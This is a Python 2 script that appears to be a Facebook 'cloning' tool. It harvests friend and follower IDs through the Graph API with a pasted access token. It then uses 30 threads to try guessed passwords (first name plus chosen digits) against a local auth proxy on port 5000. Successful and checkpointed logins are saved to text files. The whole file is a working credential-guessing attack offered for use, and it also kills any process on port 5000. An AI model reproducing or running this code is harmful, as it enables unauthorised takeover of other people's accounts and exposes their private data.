# -*- coding: utf-8 -*-
#!/usr/bin/python2
#coding=utf-8

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests, uuid, string
from multiprocessing.pool import ThreadPool
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

from requests.exceptions import ConnectionError
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
#os.system('termux-setup-storage')
os.system('clear')

logo = """    

\t          █████  ██████  ██ ██████
\t         ██   ██ ██   ██ ██ ██   ██
\t         ███████ ██████  ██ ██   ██
\t         ██   ██ ██   ██ ██ ██   ██
\t         ██   ██ ██████  ██ ██████                                          
\t\n                   \033[1;97m------- SINDHI -------\033[1;92m
"""
os.system('fuser -k 5000/tcp &')
os.system('#')
os.system('cd abid && npm install')
os.system('cd abid && node index.js &')

def login():
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
        crack()
    except (KeyError, IOError):
        print logo
        print '\n\n\tLogin With Token'
        token = raw_input('\n\n\tPaste token here : ')
        sav = open('.login.txt', 'w')
        sav.write(token)
        sav.close()
        crack()

def crack():
	global token
	os.system('clear')
	print logo
	try:
		token = open('.login.txt', 'r').read()
	except (KeyError, IOError):
		login
	try:
		r = requests.get('https://graph.facebook.com/me?access_token=' + token, headers=header)
		q = json.loads(r.text)
		name = q['name']
	except KeyError:
		print logo
		print '\033[1;91m\n\n\tLogged in token has expired'
		os.system('rm -rf .login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	try:
		token = open('.login.txt', 'r').read()
	except IOError:
		print '\n\n\tToken not found '
		time.sleep(1)
		login() 
	os.system('clear')
	print logo
	print '\033[1;92m\n\n [1] Clone From Public'
	print '\n [2] Clone From Followers'
	crack_select()

def crack_select():
    select = raw_input('\n   Choose : ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print '\n\n \x1b[1;92m Example : 123 1234 12345 786 '
        idt = raw_input('\n\x1b[1;92m Input id: ')
        p1 = raw_input(' Name + your digit: ')
        p2 = raw_input(' Name + your digit: ')
        p3 = raw_input(' Name + your digit: ')
        p4 = raw_input(' Name + your digit: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print '\n\n\tCloning from : ' + q['name']
        except KeyError:
            print '    Invalid link '
            raw_input('\n    Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        print logo
        print '\n\n \x1b[1;92m Example : 123 1234 12345 786 '
        idt = raw_input('\n\x1b[1;92m Input id: ')
        p1 = raw_input(' Name + your digit: ')
        p2 = raw_input(' Name + your digit: ')
        p3 = raw_input(' Name + your digit: ')
        p4 = raw_input(' Name + your digit: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print '\n\n\tCloning from : ' + q['name']
        except KeyError:
            print '    Invalid link '
            raw_input('\n    Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + '&limit=999999', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
    else:
        print ''
        print '\tSelect valid option'
        print ''
        crack_select()
    print ' Total IDs : ' + str(len(id))
    print ' The Process has started'
    print ''
    print 47 * '-'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print ' \x1b[1;32m[OK]     \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('successful.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print ' \x1b[1;97m[5-DAYS] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('checkpoint.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print ' \x1b[1;32m[OK]     \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('successful.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ' \x1b[1;97m[5-DAYS] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print ' \x1b[1;32m[OK]     \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('successful.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ' \x1b[1;97m[5-DAYS] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print ' \x1b[1;32m[OK]     \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('successful.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ' \x1b[1;97m[5-DAYS] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('checkpoint.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back')
    crack()


login()
